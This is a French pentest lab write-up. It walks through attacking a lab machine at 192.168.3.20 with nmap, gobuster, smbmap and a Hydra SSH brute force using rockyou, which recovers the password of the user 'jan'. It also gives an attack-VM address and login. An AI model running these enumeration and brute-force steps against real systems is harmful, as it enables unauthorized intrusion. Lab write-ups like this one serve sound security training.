---
title: "Machines du Lab"
author: [Olivier LASNE - olivier@lasne.pro]
date: "2020-01-25"
subject: "Pentest"
keywords: [Linux, bash, ligne de commande, shell, administration]
subtitle: ""
lang: "fr"
titlepage: true
...

# Installation d'outils

On va utiliser `sshuttle` pour avoir un pseudo VPN en SSH depuis notre VM d'attaque.\
```bash
sudo apt install sshuttle
```

Pour le lancer, on peut utiliser la commande 
```bash
sudo sshuttle -r kali@137.74.90.91:22808 192.168.3.1/24
```

__Bonus :__

Vous pouvez utiliser `sshfs` pour monter un dossier du serveur distant en local.
```bash
sshfs -p 22808 kali@137.74.90.91:dossier_distant dossier_local
```

# Machine 192.168.3.20

## Nmap

On commence par un scan __`nmap`__:

```bash
# Nmap 7.91 scan initiated Mon Jan 25 22:03:06 2021 as: nmap -p- -sV -sC -oN 20/fullscan.nmap 192.168.3.20
Nmap scan report for 192.168.3.20
Host is up (0.000096s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Énumération web

On lance un __`gobuster`__ sur le site web pour découvrir du contenu supplémentaire sur le site.

```bash
$ gobuster dir -u http://192.168.3.20/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gb_med.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.3.20/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2021/01/25 22:08:16 Starting gobuster
===============================================================
/development (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/25 22:08:59 Finished
===============================================================
```

![Dossier developement](./images/dev_folder.png)

## Partage SMB

On utilise __`smbmap`__ pour lister les partages SMB disponnibles: 
```bash
$ smbmap -H 192.168.3.20   
[+] Guest session       IP: 192.168.3.20:445    Name: 192.168.3.20                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.3.11-Ubuntu)
```


python3 /usr/share/doc/python3-impacket/examples/smbclient.py 192.168.3.20

Bruteforce Hydra
```bash
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.3.20                                                                                 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-b
inding, these *** ignore laws and ethics anyway).                                                                                                             
                                                                                                                                                              
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 00:05:07                                                                            
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                         
[DATA] max 16 tasks per 1 server, overall 16 tasks, 71721995 login tries (l:5/p:14344399), ~4482625 tries per task                                            
[DATA] attacking ssh://192.168.3.20:22/                                                                                                                       
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 71721819 to do in 6753:29h, 16 active                                                                         
[STATUS] 140.00 tries/min, 420 tries in 00:03h, 71721579 to do in 8538:17h, 16 active                                                                         
[22][ssh] host: 192.168.3.20   login: jan   password: armando 
```